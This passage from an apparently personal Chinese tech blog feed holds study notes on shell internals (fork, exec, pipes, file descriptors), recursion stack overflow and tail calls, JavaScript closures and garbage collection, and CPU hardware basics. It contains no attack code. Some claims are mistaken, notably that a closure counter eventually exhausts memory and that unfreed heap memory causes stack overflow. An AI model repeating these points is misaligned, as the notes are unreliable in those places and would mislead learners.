title="总结"></a>总结</h2><p>信息搜索大致就是知道一个问题后去对问题进行进一步搜索，排除，搜索，排除，最后获取正确的想知道的信息，突然感觉没啥意思，当随笔记吧。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;写着玩的小笔记。&lt;/p&gt;</summary>
    
    
    
    
    <category term="笔记" scheme="http://example.com/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>shell部分基础实现原理</title>
    <link href="http://example.com/2021/06/05/shell%E9%83%A8%E5%88%86%E5%9F%BA%E7%A1%80%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/"/>
    <id>http://example.com/2021/06/05/shell%E9%83%A8%E5%88%86%E5%9F%BA%E7%A1%80%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/</id>
    <published>2021-06-05T12:33:45.000Z</published>
    <updated>2021-06-05T12:47:29.058Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>记录shell是如何实现的，实例以后有时间补上。</p><span id="more"></span><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>​        操作系统为了保证系统安全限制了不同程序间的访问权限，比如为了防止一些程序非法使用其他程序的内存数据，不正确的使用计算机底层资源而对计算机造成破坏，划分了2个权限等级用户态和内核态。</p><p>​        一般用户使用的程序如浏览器，播放器等程序运行在用户态，内核程序运行在内核态，可以访问内存的所有数据，包括计算机的外围设备，如硬盘网卡，用户态的用户态程序只能受限的访问内存，不允许使用计算机的底层资源，如硬盘网卡等，但有时用户态需要使用一些计算机的底层资源，如使用IO设备获取或输出数据，从外设如硬盘中获取数据，为了能够使用户态程序能够完成上述目的又产生了一个机制，即系统调用，通过从用户态使用系统调用进入内核态，根据不同的系统调用完成特定的目的。</p><p>​        除了系统调用能够从用户态进入内核态外还有异常和外设中断也能完成从用户态进入内核态的目的，如果说系统调用是人为可控的从用户态切换到内核态，如用户态程序可以使用fork()函数创建子线程，其实就是通过调用sys_fork系统调用切换到内核态完成子线程创建(fork()调用sys_fork系统调用具体实现没有探究过，猜测应该是类似于函数的封装)，那么异常和外设中断则是不可控的，完全由硬件负责的，比如异常即是用户态程序在执行程序时发生了错误，此时的用户态不足以对错误进行处理就需要进入内核态对错误进行处理，此时就需要中断来对异常进行处理(值得一提的是中断也是程序并发中重要的一部分，但和这里不同)，如程序中出现整数除0就是异常。另外中断又分为内中断与外中断，区别在于中断的信号来源于哪里，详细介绍的话系统调用、异常和外设中断都可以独立用一篇笔记记录，这里用一张图省略中断吧：</p><p><img src="/2021/06/05/shell%E9%83%A8%E5%88%86%E5%9F%BA%E7%A1%80%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/cach/image-20210602175714379.png" alt="image-20210602175714379"></p><p>​        从上图中可以发现异常其实就是属于内中断，最后的外设中断属于外中断，虽然其实都是中断但因为中断信号来源不同将其分为两部分，再说一下外设中断，上图的I/O操作完成发生中断信号即是典型的外中断例子，解释的话就是外设在用户态程序正常运行时如果相应的硬件完成了用户的请求会向CPU发出中断信号，使其暂停用户态程序去处理外设，而要使用外设自然要进入内核态，也能完成用户态与内核态的切换。</p><p>​        下面放几张图便于理解：</p><p><img src="/2021/06/05/shell%E9%83%A8%E5%88%86%E5%9F%BA%E7%A1%80%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/cach/image-20210602180030411.png" alt="image-20210602180030411"></p><p><img src="/2021/06/05/shell%E9%83%A8%E5%88%86%E5%9F%BA%E7%A1%80%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/cach/image-20210602180050035.png" alt="image-20210602180050035"></p><p>​        最后前面3者的区别说了再说一下相同点，其实3者最后都是使用的中断。</p><p>​        笔者已知的能够通过系统调用调用计算机底层资源的方法除了库函数外还有shell，终于来到了本文的主题shell：</p><p><img src="/2021/06/05/shell%E9%83%A8%E5%88%86%E5%9F%BA%E7%A1%80%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/cach/image-20210602172642883.png" alt="image-20210602172642883"></p><p>​        shell其实是一个特殊的程序，之所以说它特殊是因为它并不在内核态，仍然处于用户态，但它却可以使用内核态的资源，因为它的命令与库函数一样封装了系统调用，在shell中直接使用命令条即可使用各种系统调用，类似应用程序与硬件间的操作系统，一般一个shell即是一个终端，终端是一个硬件设备。</p><p>​        一个shell的基础主要有进程、内存、文件描述符、管道、文件系统等，下面对其进行介绍。</p><h3 id="进程和内存"><a href="#进程和内存" class="headerlink" title="进程和内存"></a>进程和内存</h3><p>Unix中的进程由内核管理的进程状态信息(PCB)、数据段和指令段组成。</p><p>一般程序创建进程需要用到的系统调用有fork、exec、wait和exit四个系统调用。</p><p>fork：创建一个子进程，子进程与自身共享内存空间，使用写时复制技术，当其中一个进程需要修改数据时将原始数据拷贝一份用以给该进程进行修改数据，之后父子进程独立保存各自的数据。</p><p>exec：使用新的进程空间替换当前的进程空间。</p><p>ps：如何创建一个新进程？先使用fork创建一个子进程，之后的子进程实际上和父进程还是一样的数据，再使用exec将当前进程替换就获得了一个新的独立进程，另外Linux没有进程线程之分，除了init外的所有新进程都是先fork的init进程，之后使用exec对新进程进行占用创建的独立进程。</p><p>wait：暂停当前进程，直到当前进程的一个子进程返回。</p><p>exit：停止当前进程的执行，并该进程释放内存、文件等资源。</p><p>类unix中的shell就是使用上述系统调用来运行用户传入的指令：</p><p>先在main函数中定义一个getcmd()函数循环调用，使其读取接收用户的命令条输入，之后对于每条命令都通过fork去创建子进程去处理命令，处理命令由定义的runcmd()函数实现，然后父进程通过wait等待子进程执行结束。</p><p>runcmd()：通过exec加载实际的目标程序(如”echo hello”)来替代当前的runcmd进程，当执行结束后目标程序(如”echo”)会自己调用exit，从而退回到之前main函数的wait地址等待处理之后的命令。</p><p>可以把进程的创建看作shell的执行基础。</p><h3 id="I-O和文件描述符"><a href="#I-O和文件描述符" class="headerlink" title="I/O和文件描述符"></a><strong>I/O和文件描述符</strong></h3><p>unix中所有可以进行I/O操作的进程都可以当作“文件”，每个进程使用一个文件描述符来对其进行访问，包括打开文件、目录、设备、创建一个管道，都可以看作字节流来访问。</p><p>shell默认会一直打开3个文件描述符：0(stdin),  1(stdout),  2(stderr)。文件描述符其实就是一个与访问对象绑定的整数，从0开始依次加1；新分配的文件描述符总是当前进程未被使用的最小描述符。</p><p>通过文件描述符和fork可以实现shell中的I/O重定向，fork出来的子进程与父进程共享文件描述符表，父进程之前打开的文件，子进程都可以直接去访问。exec虽然会替换掉当前进程空间，但是它会将文件描述符表保存下来，所以shell可以通过“fork+打开重定向的文件+exec”来实现I/O重定向。下面是 cat &lt; input.txt 的例子，cat默认会从0描述符中读，往1描述符中写：</p><p><img src="/2021/06/05/shell%E9%83%A8%E5%88%86%E5%9F%BA%E7%A1%80%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/cach/cat.png" alt="cat.png"></p><p>close(0)关闭0描述符</p><p>open打开需要重定向的文件，返回当前可用的最小描述符即0，因此0描述符便和input.txt文件绑定</p><p>exec(“cat”,argv)执行cat命令，由于exec会将文件描述表保存下来，因此cat会从0描述符读取，就相当于从input.txt文件中读取，然后往1(stdout)描述符中写，从而实现读取重定向</p><p>输出重定向类似读取重定向，通过close(1)和open()，将重定向文件与1描述符绑定</p><p>需要注意fork会在父子进程间共享文件描述符表，但是一旦某一方对其进行修改了则会copy一份(相当于初始内存相同，之后数据分开保存)，然而文件偏移则是一直共享的，即一方写完后另一方再写则是连续下去写的，看下面一个例子：</p><p><img src="/2021/06/05/shell%E9%83%A8%E5%88%86%E5%9F%BA%E7%A1%80%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/cach/fd_offset.png" alt="fd_offset">    输出结果： <img src="/2021/06/05/shell%E9%83%A8%E5%88%86%E5%9F%BA%E7%A1%80%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/cach/output.png" alt="output"></p><p>除了fork是会共享文件偏移的，dup系统调用复制的一个新文件描述符也与原描述符共享文件偏移（dup返回的描述符也是当前可用的最小描述符）：</p><p><img src="/2021/06/05/shell%E9%83%A8%E5%88%86%E5%9F%BA%E7%A1%80%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/cach/dup.png" alt="dup">输出结果也是：hello world</p><h3 id="管道Pipes"><a href="#管道Pipes" class="headerlink" title="管道Pipes"></a><strong>管道Pipes</strong></h3><p>管道是一段内核缓冲区，使用一对文件描述符对其进行操作，即一个写一个读，可用于进程间通信，下面看一个例子：</p><p><img src="/2021/06/05/shell%E9%83%A8%E5%88%86%E5%9F%BA%E7%A1%80%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/cach/pipe.png" alt="pipe"></p><p>通过pipe系统调用创建一个管道，并将其读写文件描述符保存在 数组p中（p[0]：read，p[1]：write）</p><p>通过fork创建子进程，父子进程共享p[0]和p[1]</p><p>子进程：通过dup将p[0]绑定，即与0(stdin)绑定，之后执行/bin/wc程序时就会从p[0]描述符中读取输入</p><p>父进程：直接往p[1]中写，即此时管道中有数据了，然后子进程便会读取数据进行操作，当然父进程中也可以通过exec执行命令自动往p[1]中写入数据，即通过close(1)，dup(p[1])将p[1]描述符与1(stdout)绑定</p><p>shell中的管道也可以像上面这么实现，如 ls | wc -l</p><p>创建1个管道，调用2次fork，创建2个子进程，分别调用runcmd()来处理管道左边和右边的命令。</p><p>左边负责往管道写 — close(1)，dup(p[1])，右边负责从管道读 — close(0)，dup(p[0])，父进程调用2次wait，等待2个子进程结束再返回。</p><h3 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a><strong>文件系统</strong></h3><p>文件系统包括文件和目录，其中目录是一种树形的结构，根结点为root目录。</p><p>在文件系统中涉及到的系统调用有：</p><p>chdir 切换目录，mkdir 创建目录</p><p>mknod 创建设备文件，mknod(设备文件名，主设备号， 次设备号)</p><p>open/read/write 操作文件</p><p>fstat 获取文件描述符指向文件对象的信息</p><p>link 创建(硬)链接，即有多个文件名指向相同的索引节点inode，因此当把其中一个删除了，其他文件的内容仍然保留</p><p>symlink 创建软链接文件，该文件指向新的inode，并记录了指向原文件inode的路径信息，当把原文件删除了，该链接文件的内容也不存在了</p><p>unlink 删除一个文件并减少它的链接数，只有当这个文件对应的inode节点的链接数为0且没有指向它的文件描述符时，才会释放对应的磁盘空间</p><p>类unix可以将文件系统的操作实现为用户级别的程序（如: mkdir, ln, rm  …），而不是嵌入在shell中，因此在shell中只需要通过exec来加载对应的可执行文件（如:  /bin/mkdir），即可实现用户想执行的命令行功能。但有一个例外：cd命令，因为shell执行命令是通过fork创建子进程来执行的，这样的话对于cd命令就只是子进程切换了目录，父进程并没有，从而用户输入下一条命令时还是从父进程处fork一份去执行，因此目录始终是原始目录。所以，cd命令需要在shell中实现（直接调用chdir syscall），而不是通过在一个用户程序中实现，然后在shell中调用exec(“/bin/cd”)来执行。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>上面的shell实现实际上并不完整，讲解也不算深入，是笔者偶尔看了一篇博客后抄的，以后如果有时间再学习下补充。s</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;记录shell是如何实现的，实例以后有时间补上。&lt;/p&gt;</summary>
    
    
    
    
    <category term="操作系统" scheme="http://example.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>一些函数溢出问题</title>
    <link href="http://example.com/2021/06/05/%E4%B8%80%E4%BA%9B%E4%B8%8E%E5%87%BD%E6%95%B0%E6%9C%89%E5%85%B3%E7%9A%84%E6%BA%A2%E5%87%BA%E9%97%AE%E9%A2%98/"/>
    <id>http://example.com/2021/06/05/%E4%B8%80%E4%BA%9B%E4%B8%8E%E5%87%BD%E6%95%B0%E6%9C%89%E5%85%B3%E7%9A%84%E6%BA%A2%E5%87%BA%E9%97%AE%E9%A2%98/</id>
    <published>2021-06-05T12:32:47.000Z</published>
    <updated>2021-06-05T12:48:17.381Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>日常笔记。</p><span id="more"></span><h2 id="C程序函数栈溢出"><a href="#C程序函数栈溢出" class="headerlink" title="C程序函数栈溢出"></a>C程序函数栈溢出</h2><h3 id="函数调用栈溢出"><a href="#函数调用栈溢出" class="headerlink" title="函数调用栈溢出"></a>函数调用栈溢出</h3><p>一般函数调用时分配的栈空间大小是有限的，当函数调用次数过多(之前看某文章时好像是说几千次就会发生溢出？应该是更多次)或出现死循环时因为会不停的压栈，在这个过程中就会超出栈空间产生溢出。</p><p>严谨点解释主要是2点原因：</p><p>1、函数调用层次太深。函数递归调用时，系统要在栈中不断保存函数调用时的现场和产生的变量，如果递归调用太深，就会造成栈溢出，这时递归无法返回。再有，当函数调用层次过深时也可能导致栈无法容纳这些调用的返回地址而造成栈溢出。<br>2、动态申请空间使用之后没有释放。由于C语言中没有垃圾资源自动回收机制，因此，需要程序主动释放已经不再使用的动态地址空间。申请的动态空间使用的是堆空间，动态空间使用不会造成堆溢出。</p><p>个人感觉一般的栈溢出是针对某个栈帧，而函数调用产生的栈溢出更像是用完了整个栈空间。</p><p>这里有一个例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function fact(n) &#123;</span><br><span class="line">    if (n &lt;= 0) &#123;</span><br><span class="line">        return 1;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return n * fact(n - 1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">fact(10000)</span><br></pre></td></tr></table></figure><p>可以看到，这里就会产生栈溢出。如果函数可以不调用很多次可以限制调用次数，如果必须不能限制调用次数可以使用尾递归调用来解决这个问题。</p><h3 id="static变量优化"><a href="#static变量优化" class="headerlink" title="static变量优化"></a>static变量优化</h3><p>使用static变量替代nonstatic局部变量在递归函数设计中，可以使用static变量替代nonstatic局部变量（即栈对象），这不仅可以减少每次递归调用和返回时产生和释放nonstatic对象的开销，而且static对象还可以保存递归调用的中间状态，并且可为各个调用层所访问。</p><h3 id="尾递归调用优化"><a href="#尾递归调用优化" class="headerlink" title="尾递归调用优化"></a>尾递归调用优化</h3><p>若函数在函数尾部调用函数自身（或是一个尾调用本身的其他函数等等），则称这种情况为尾递归，尾递归也是递归的一种特殊情形，尾递归是一种特殊的尾调用，即在尾部直接调用自身的递归函数，对尾递归的优化也是关注尾调用的主要原因，尾调用不一定是递归调用，但是尾递归特别有用，也比较容易实现。</p><p>特点：</p><p>1、在尾部调用的是函数自身 (Self-called)；</p><p>2、可通过优化，使得计算仅占用常量栈空间 (Stack Space)。</p><p>​                                                                                                         ——维基百科尾调用词条</p><p>以下是尾递归调用的例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function fact(n, r) &#123;</span><br><span class="line">    if (n &lt;= 0) &#123;</span><br><span class="line">        return 1 * r;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return fact(n - 1, r * n);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>与普通递归函数相比尾递归函数在展开的过程中计算并且缓存了结果，使得不会像普通递归函数那样展开出非常庞大的中间结果，因为这不会产生栈溢出？不是。</p><p>尾递归函数依然还是递归函数，如果不优化依然跟普通递归函数一样会栈溢出，该展开多少层依旧是展开多少层，不会栈溢出是因为语言的编译器或者解释器所做了“尾递归优化”，因此不会产生栈溢出。</p><h3 id="增加栈空间"><a href="#增加栈空间" class="headerlink" title="增加栈空间"></a>增加栈空间</h3><p>最后这条基本不能实现，只存在于想象中，增加栈空间实际上更多的是可以增加循环的次数，如果程序是死循环即使增加再多的栈空间还是会耗尽栈空间，并且栈空间是系统自动分配的不能人为分配，所以这种方法治标不治本或根本不能使用。</p><h2 id="JavaScript程序函数闭包尺寸溢出"><a href="#JavaScript程序函数闭包尺寸溢出" class="headerlink" title="JavaScript程序函数闭包尺寸溢出"></a>JavaScript程序函数闭包尺寸溢出</h2><p>这是今天下午听同学说闭包的时候学到的东西，首先说一下闭包。</p><h3 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h3><p>介绍闭包前先说一下变量作用域，一般程序中的变量根据作用范围分为全局变量和局部变量，比如存在两个函数A和B和函数外部定义变量C，函数A定义了变量a，函数B定义了变量b，当使用函数A和函数B时可以使用变量C，而函数A、B外的函数却不能使用变量a和b，当函数A和B使用结束后程序会自动销毁局部变量，而全局变量是一直保存可以使用的，则变量C是全局变量，变量a、b为局部变量。全局变量和局部变量官方解释不是这样，这里只是大概介绍下。</p><p>闭包有什么用？</p><p>闭包能够延伸变量的作用域范围，通过使变量的值一直保存在特定的内存空间中，使某函数外的函数在某函数使用结束内部变量本该销毁后也可以使用某函数内的变量。</p><p>这里有一个更官方的作用解释：</p><p>闭包（closure）指有权访问另一个函数作用域中变量的函数   —– JavaScript 高级程序设计</p><p>这里和下面有几个使用闭包的小例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var fn  =function()&#123;</span><br><span class="line">    var sum = 0</span><br><span class="line">    return function()&#123;</span><br><span class="line">        sum++</span><br><span class="line">        console.log(sum);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">fn()() //1</span><br><span class="line">fn()() //1</span><br></pre></td></tr></table></figure><p>这里有一个有趣的问题，为什么连续调用两次fn函数后sum还是1？</p><p>答案是sum是函数内部的局部变量，当fn函数使用结束后sum变量被程序自动销毁以节省内存空间，想要一直能够使用sum，使sum变量值增加可以使用下面的函数。</p><h3 id="内存溢出"><a href="#内存溢出" class="headerlink" title="内存溢出"></a>内存溢出</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  var fn  =function()&#123;</span><br><span class="line">    var sum = 0</span><br><span class="line">    return function()&#123;</span><br><span class="line">        sum++</span><br><span class="line">        console.log(sum);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">  fn1=fn() </span><br><span class="line">  fn1()   //1</span><br><span class="line">  fn1()   //2</span><br><span class="line">  fn1()   //3</span><br></pre></td></tr></table></figure><p>重点在于fn1=fn()，因为将fn函数赋给了fn1，所以变量sum也就没有销毁，之后再调用fn1函数相当于调用fn函数，但sum变量因为一直存在所以能够增加，但这里同时存在了一个问题，也就是内存溢出，</p><p>fn1内的sum变量一直不释放而是保存在内存中，那么sum变量也就会一直更新，直到内存占满，之后就会产生溢出。</p><h3 id="处理方法"><a href="#处理方法" class="headerlink" title="处理方法"></a>处理方法</h3><p>这种溢出本质上属于人为的错误而不是系统错误，因为程序员在变量使用了闭包后系统就不能再自动释放内存，而且程序员也不知道会产生溢出，这种情况下机器和人都不知道，看起来也就不能避免，但实际上有一种方法可以防范这种溢出，当程序员确定变量之后不会再使用到后应该手动释放变量，不管是出于释放内存空间还是出于安全问题程序员都应该养成这样的习惯，像下面的函数就不会再产生内存溢出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">var fn  =function()&#123;</span><br><span class="line">    var sum = 0</span><br><span class="line">    return function()&#123;</span><br><span class="line">        sum++</span><br><span class="line">        console.log(sum);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">fn1=fn() </span><br><span class="line">fn1()   //1</span><br><span class="line">fn1()   //2</span><br><span class="line">fn1()   //3</span><br><span class="line">fn1 = null // fn1的引用fn被手动释放了</span><br><span class="line">fn1=fn()  //num再次归零</span><br><span class="line">fn1() //1</span><br></pre></td></tr></table></figure><p>当手动将fn1置空后内存中的数据自然就被清空，也就杜绝了内存溢出，但要注意，一定要确定被释放的变量之后不会再使用。</p><h3 id="js内存的回收机制"><a href="#js内存的回收机制" class="headerlink" title="js内存的回收机制"></a>js内存的回收机制</h3><p>实际上每种语言都有对内存的回收处理，只是使用机制不同，其中也有部分相似的机制。</p><p>任何数据类型变量如果只是被定义而没有使用那么他们并没有被分配内存，只有在真正使用时才会被分配内存，并且像局部变量在使用后还会被系统自动销毁释放内存以免占用内存空间。</p><p>像浏览器一般就使用2种回收方法：</p><p>1、标记清除</p><p>当变量进入执行环境时标记这个变量为“进入环境”，从逻辑上讲，永远不能释放进入环境的变量所占用的内存，因为只要执行流进入相应的环境，就可能会用到他们，当变量离开环境时，则将其标记为“离开环境”，标记为“离开环境”的变量就会被系统自动清理。</p><p>2、引用计数</p><p>引用计数的含义是跟踪记录每个值被引用的次数，当声明了一个变量并将一个引用类型赋值给该变量时，则这个值的引用次数就是1，相反如果包含对这个值引用的变量又取得了另外一个值，则这个值的引用次数就减1，当这个引用次数变成0时，则说明没有办法再访问这个值了，因而就可以将其所占的内存空间给收回来，之后垃圾收集器下次再运行时，它就会释放那些引用次数为0的值所占的内存。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;日常笔记。&lt;/p&gt;</summary>
    
    
    
    
    <category term="漏洞" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>计算机硬件学习</title>
    <link href="http://example.com/2021/06/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A1%AC%E4%BB%B6%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2021/06/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A1%AC%E4%BB%B6%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-06-05T12:32:33.000Z</published>
    <updated>2021-06-05T12:47:45.329Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>计算机硬件的学习笔记。</p><span id="more"></span><h2 id="1、计算机分类"><a href="#1、计算机分类" class="headerlink" title="1、计算机分类"></a>1、计算机分类</h2><p>1.1 家用台式计算机，介绍略。</p><p>1.2 笔记本电脑，介绍略。</p><p>1.3 服务器，一种特殊计算机，具有高速CPU运算能力、强大的I/O外部数据吞吐能力和扩展性，可以长时间运行为网络中其它客户机(如个人PC机、智能手机等)提供计算或应用服务，根据服务器所提供的服务，一般来说服务器都具备承担响应服务请求、承担服务、保障服务的能力。服务器内部结构与普通的计算机内部结构相差不大，与个人PC机内部结构相似，也具有cpu、硬盘、内存、系统、系统总线等，但服务器的处理能力、稳定性、可靠性、安全性、可扩展性、可管理性等方面要更强。</p><h2 id="2、计算机硬件组成部分"><a href="#2、计算机硬件组成部分" class="headerlink" title="2、计算机硬件组成部分"></a>2、计算机硬件组成部分</h2><p>现代计算机大多采用冯诺依曼机的组成分为5大组成部件：运算器、控制器、存储器、输入设备和输出设备，CPU由运算器和控制器组成，负责计算机的数据处理和指令控制，存储器的内存负责临时存储数据，硬盘负责永久存储数据，输入设备和输出设备负责数据的输入和输出，磁盘和磁带即属于输入设备，以上5大部件采用总线连接，运算器和控制器使用CPU内部的片内总线连接。CPU、存储器和输入输出设备通过系统总线连接。</p><p>完整的计算机系统包括：</p><p><img src="/2021/06/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A1%AC%E4%BB%B6%E5%AD%A6%E4%B9%A0/cach/image-20210529113134630.png" alt="image-20210529113134630"></p><h2 id="3、CPU介绍"><a href="#3、CPU介绍" class="headerlink" title="3、CPU介绍"></a>3、CPU介绍</h2><p>3.1 介绍</p><p>简单说计算机三大核心部件是CPU、存储器和输入/输出设备，中央处理器CPU是负责计算机控制和计算的核心部件，主要包括两部分控制器和运算器，负责读取指令、对指令译码并执行指令、处理运算数据等。<br>计算机体系结构中CPU对计算机所有硬件资源(如存储器、输入输出单元)进行控制调配，计算机系统中所有软件层的操作最后都通过指令集映射为CPU的操作。</p><p>为了使程序并发运行，计算机需要同时处理多个程序，单个CPU在某一时刻只能被一个程序所使用，因此为了保证程序的并发执行并提高运行效率出现了超线程技术，通过将每个CPU模拟出一个虚拟核心，这样一个CPU就有了2个核心就能提高处理程序的数量，但这种技术因为本质上还是使用一个CPU实际上真正有的核心数只有一个，所以终究效率终究比多CPU核心慢，后来就出现了CPU多核，在CPU上集成多个核心，比如在一个CPU上集成4个核心就能够同时处理4个程序，再配合超线程技术就能同时处理8个程序大大提高了计算机的并发性。</p><p>物理上的双核，通过超线程技术，使每个物理核心模拟出一个虚拟核心出来，这样可以同时处理多个任务。但实际上它还是双核，但是性能比双核要强，相当于假4核，低于真正的物理四核心处理器。</p><p>3.2 指令集</p><p>指令是某类CPU在设计时就规定好的能够完成特定操作的二进制代码，指令集是某类CPU指令的集合，计算机通过指令集控制CPU进行计算和控制系统，指令集是提高微处理器效率的最有效的工具之一，指令集的优劣关系到CPU的性能发挥，它也是CPU性能体现的一个重要标志。</p><p>指令集可分为复杂指令集和精简指令集两种。</p><p>3.3 复杂指令集(CISC指令集)，最初计算机性能的提升是通过增加硬件的复杂性获得的，通过向硬件中不断增加可实现复杂功能的指令和各种编址方式，在这方式下产生的指令集即是复杂指令集，往往使用CISC指令集的计算机包含指令至少有300条，在CISC微处理器中，程序的各条指令是按顺序串行执行的，每条指令中的各个操作也是按顺序串行执行的，这种顺序执行的优点是控制简单，但计算机各部分的利用率不高，并且执行也不灵活，执行速度慢。其实它是英特尔生产的x86系列(也就是IA-32架构)CPU及其兼容CPU，如AMD、VIA的，即使是现在新起的X86-64(也被称为AMD64)都是属于CISC的范畴。</p><p>3.4 精简指令集(RISC)，虽然采用CISC指令集的计算机有较强的处理高级语言能力能够提高计算机性能，但随着复杂指令集的日益复杂，更加庞杂的指令集更加难以实现，即使实现后以后降低系统性能，出于这种考虑产生了RISC指令集，一般计算机中的所有指令中使用率最高的指令只占所有指令的百分之20，比如存取值指令，剩下的百分之80指令不常用，所以为了提高效率并且不影响计算机的正常工作，出现了指令集使用那些使用率的指令并使用一些必要的指令支持操作系统和高级语言，这样既不影响计算机的正常使用，还减少了指令集中的指令。在这种CPU的设计中RISC指令集较为精简，每个指令的运行时间都很短，完成的动作也很单纯，指令的执行效能较佳，但是若要做复杂的事情，就要由多个指令来完成。常见的RISC指令集CPU主要例如Sun公司的SPARC系列、IBM公司的Power Architecture（包括PowerPC）系列、与ARM系列等。【注：Sun已经被Oracle收购；】　　</p><p>3.5 CISC和RISC的区别</p><p><img src="/2021/06/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A1%AC%E4%BB%B6%E5%AD%A6%E4%B9%A0/cach/image-20210529123436730.png" alt="image-20210529123436730"></p><p>​        从硬件角度看CISC处理的是不等长指令集，它对不等长指令进行分割，因此在执行单一指令的时需要进行较多的处理工作。而RISC执行等长精简指令集，CPU在执行指令时速度较快且性能稳定，因此在并行处理方面RISC明显优于CISC更适合流水线式处理，RISC可同时执行多条指令，它可以将一条指令分割成若干个进程或线程交由多个处理器同时执行，由于RISC执行的是精简指令集，所以它的制造工艺简单且成本低廉。<br>　　从软件角度看，CISC运行的是DOS、Windows操作系统，它拥有大量的应用程序。因为全世界有65%以上的软件厂商都理为基于CISC体系结构的PC及其兼容机服务的，而RISC在此方面却显得有些势单力薄，虽然在RISC上也可运行DOS、Windows，但是需要一个翻译过程，所以运行速度要慢许多。<br>　　目前CISC与RISC正在逐步走向融合，Pentium Pro、Nx586、K5就是一个最明显的例子，它们的内核都是基于RISC体系结构的。他们接受CISC指令后将其分解分类成RISC指令以便在遇一时间内能够执行多条指令。由此可见，下一代的CPU将融合CISC与RISC两种技术，从软件与硬件方面看二者会取长补短。 </p><p>3.6 CPU的演变</p><p>CPU最开始取值、解码、执行这三个过程是同时进行的，这种情况下后一个过程完成需要等待前面的过程执行完毕，造成时间浪费。</p><p><img src="/2021/06/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A1%AC%E4%BB%B6%E5%AD%A6%E4%B9%A0/cach/image-20210529124237752.png" 